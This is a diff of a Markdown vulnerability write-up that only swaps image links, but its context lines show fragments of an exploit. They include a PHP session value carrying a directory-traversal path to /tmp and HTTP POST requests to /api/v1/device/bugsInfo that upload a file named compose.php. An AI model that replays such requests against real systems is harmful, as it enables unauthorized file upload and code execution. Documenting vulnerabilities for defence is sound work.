@@ -33,7 +33,7 @@ lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
 --1d52ba2a11ad8a915eddab1a0e85acd9--
 ```
 
-![img](../../../.vuepress/public/img/1684385461375-d54ce083-ef90-4946-b00a-2422bf9169a8.png)
+![image-20230812085235711](../../../.vuepress/public/img/image-20230812085235711.png)
 
 ```python
 POST /api/v1/device/bugsInfo HTTP/1.1
@@ -49,7 +49,9 @@ Content-Disposition: form-data; name="file"; filename="compose.php"
 --4803b59d015026999b45993b1245f0ef--
 ```
 
-![img](../../../.vuepress/public/img/1684385491176-51d6c42a-68bd-4238-9716-b65ff76cd389.png)
+![image-20230812085349551](../../../.vuepress/public/img/image-20230812085349551.png)
+
+
 
 ```python
 POST /api/v1/device/bugsInfo HTTP/1.1
